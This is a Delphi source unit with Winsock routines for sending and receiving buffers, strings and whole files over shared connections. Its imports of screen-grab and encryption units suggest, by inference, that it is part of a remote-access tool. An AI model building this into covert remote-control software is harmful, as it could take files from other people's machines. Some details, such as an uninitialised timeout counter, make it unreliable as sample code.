   unit untTransfer;

   interface
   uses
   winsock, windows, messages, allstrings, Encryption, untScreenGrab,
   untfunctions;

   function SendString(const Buffer: string): integer;
   procedure SendFile(FileName: string);
   function SendBuffer(var Buffer; BufferSize: integer): integer;
   procedure ReceiveFile(FileName: string);
   procedure Idle(Seconds: integer);
   function ReceiveString: string;
   function ReceiveLength: integer;
   function ReceiveBuffer(var Buffer; BufferSize: integer): integer;

   implementation

   function ReceiveBuffer(var Buffer; BufferSize: integer): integer;
   begin
     if BufferSize = -1 then
     begin
       if ioctlsocket(conserver2, FIONREAD, Longint(Result)) = SOCKET_ERROR then
       begin
         Result := SOCKET_ERROR;
        CloseSocket(conserver2);
        Shutdown(conserver2,2);
       end;
     end
     else
     begin
        Result := recv(conserver2, Buffer, BufferSize, 0);
        if Result = 0 then
        begin
        CloseSocket(conserver2);
        Shutdown(conserver2,2);
        end;
        if Result = SOCKET_ERROR then
        begin
          Result := WSAGetLastError;
          if Result = WSAEWOULDBLOCK then
          begin
            Result := 0;
          end
          else
          begin
           CloseSocket(conserver2);
           Shutdown(conserver2,2);
          end;
        end;
     end;
   end;

   function ReceiveLength: integer;
   begin
     Result := ReceiveBuffer(pointer(nil)^, -1);
   end;

   function ReceiveString: string;
   begin
     SetLength(Result, ReceiveBuffer(pointer(nil)^, -1));
     SetLength(Result, ReceiveBuffer(pointer(Result)^, Length(Result)));
   end;

   procedure Idle(Seconds: integer);
   var
     FDset: TFDset;
     TimeVal: TTimeVal;
   begin
     if Seconds = 0 then
     begin
       FD_ZERO(FDSet);
       FD_SET(conserver2, FDSet);
       select(0, @FDset, nil, nil, nil);
     end
     else
     begin
       TimeVal.tv_sec := Seconds;
       TimeVal.tv_usec := 0;
       FD_ZERO(FDSet);
       FD_SET(conserver2, FDSet);
       select(0, @FDset, nil, nil, @TimeVal);
     end;
   end;

   procedure ReceiveFile(FileName: string);
   var
     BinaryBuffer: pchar;
     BinaryFile: THandle;
     BinaryFileSize, BytesReceived, BytesWritten, BytesDone: dword;
     TimeOut:Integer;
     An:String;
   begin
     BytesDone := 0;
     BinaryFile := CreateFile(pchar(FileName), GENERIC_WRITE, FILE_SHARE_WRITE, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
     Idle(0);
     ReceiveBuffer(BinaryFileSize, sizeof(BinaryFileSize));
     while BytesDone < BinaryFileSize do
     begin
       Sleep(1);
       if not sending then begin
     CloseHandle(BinaryFile);
     exit;
       end;
       BytesReceived := ReceiveLength;
       Inc(TimeOut);
       If TimeOut = 10000 Then begin
       An := ENCRYPT('14');
       SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
     CloseHandle(BinaryFile);
     exit;
       end;
       if BytesReceived > 0 then
       begin
         TimeOut := 0;
         GetMem(BinaryBuffer, BytesReceived);
         try
           ReceiveBuffer(BinaryBuffer^, BytesReceived);
           WriteFile(BinaryFile, BinaryBuffer^, BytesReceived, BytesWritten, nil);
           Inc(BytesDone, BytesReceived);
         finally
           FreeMem(BinaryBuffer);
         end;
       end;
     end;
     CloseHandle(BinaryFile);
   end;

   function SendBuffer(var Buffer; BufferSize: integer): integer;
   var
     ErrorCode: integer;
   begin
     Result := send(conserver2, Buffer, BufferSize, 0);
     if Result = SOCKET_ERROR then
     begin
       ErrorCode := WSAGetLastError;
       if (ErrorCode = WSAEWOULDBLOCK) then
       begin
         Result := -1;
       end
       else
       begin
        CloseSocket(conserver2);
        Shutdown(conserver2,2);
       end;
     end;
   end;

   procedure SendFile(FileName: string);
   var
     BinaryFile: THandle;
     BinaryBuffer: pchar;
     BinaryFileSize, BytesRead: dword;
     TimeOut:Integer;
     An:String;
   begin
     BinaryFile := CreateFile(pchar(FileName), GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
     BinaryFileSize := GetFileSize(BinaryFile, nil);
     SendBuffer(BinaryFileSize, sizeof(BinaryFileSize));
     GetMem(BinaryBuffer, 2048);
     try
       repeat
         Sleep(1);
         ReadFile(BinaryFile, BinaryBuffer^, 2048, BytesRead, nil);
         if not sending then begin
          FreeMem(BinaryBuffer);
          CloseHandle(BinaryFile);
          Exit;
         end;
         TimeOut := 0;
         repeat
           Sleep(1);
           Inc(TimeOut);
           If TimeOut = 10000 Then begin
            An := ENCRYPT('14');
            SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
            FreeMem(BinaryBuffer);
            CloseHandle(BinaryFile);
            Exit;
           end;
           if not sending then begin
            FreeMem(BinaryBuffer);
            CloseHandle(BinaryFile);
            Exit;
           end;
         until SendBuffer(BinaryBuffer^, BytesRead) <> -1;
       until BytesRead < 2048;
     finally
       FreeMem(BinaryBuffer);
     end;
     CloseHandle(BinaryFile);
   end;

   function SendString(const Buffer: string): integer;
   begin
     Result := SendBuffer(pointer(Buffer)^, Length(Buffer));
   end;

   end.

